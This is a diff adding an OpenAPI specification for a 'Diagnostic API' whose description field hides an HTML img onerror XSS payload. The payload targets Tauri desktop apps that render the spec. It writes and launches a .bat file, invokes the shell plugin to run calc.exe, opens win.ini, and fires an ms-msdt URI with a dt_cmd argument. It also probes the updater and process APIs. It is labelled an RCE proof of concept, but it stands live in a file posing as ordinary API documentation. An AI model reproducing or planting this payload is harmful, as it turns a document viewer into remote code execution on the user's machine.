@@ -1,0 +1,30 @@
+openapi: "3.0.0"
+info:
+  title: "Diagnostic API"
+  version: "1.0.0"
+  description: |
+    RCE test.
+    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE TEST (Part 3: Two-step + DoS + invoke) ===',''];var tests=[];var i=0;function add(n,f){tests.push([n,f])}function next(){if(i>=tests.length){alert(r.join('\n'));return}var name=tests[i][0];var fn=tests[i][1];i++;r.push('['+i+'] '+name);try{fn().then(function(v){r.push('  -> OK: '+JSON.stringify(v).substring(0,200))}).catch(function(e){r.push('  -> FAIL: '+String(e).substring(0,120))}).then(function(){next()})}catch(e){r.push('  -> ERR: '+String(e).substring(0,120));next()}}add('dialog.save(.bat)+fs.write+shell.open',function(){return t.dialog.save({defaultPath:'poc-test.bat',filters:[{name:'Batch',extensions:['bat']}]}).then(function(p){if(!p)return Promise.reject('user cancelled');r.push('  saved path: '+p);return t.fs.writeTextFile(p,'@echo off\r\ncalc.exe\r\n').then(function(){r.push('  .bat written OK');return t.shell.open(p)})})});add('invoke plugin:shell|open file path',function(){return t.tauri.invoke('plugin:shell|open',{path:'C:\\Windows\\System32\\calc.exe'})});add('invoke plugin:shell|open bat',function(){return t.tauri.invoke('plugin:shell|open',{path:'C:\\poc-test.bat'})});add('shell.open file:///C:/Windows/win.ini',function(){return t.shell.open('file:///C:/Windows/win.ini')});add('shell.open ms-msdt with args',function(){return t.shell.open('ms-msdt:/id PCWDiagnostic /skip force /param IT_RebijrowsVerify /dt_cmd calc')});add('updater keys',function(){r.push('  updater: '+(t.updater?Object.keys(t.updater).join(', '):'N/A'));return Promise.resolve('listed')});add('event.emit custom',function(){return t.event.emit('tauri://update',{})});add('process.relaunch (NO exec)',function(){r.push('  process.relaunch type: '+typeof t.process.relaunch);r.push('  process.exit type: '+typeof t.process.exit);return Promise.resolve('NOT calling - would crash app')});next()})()">
+servers:
+  - url: "https://api.example.com/v1"
+paths:
+  /test:
+    get:
+      operationId: runTest
+      summary: "Run test"
+      parameters:
+        - name: id
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: "OK"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
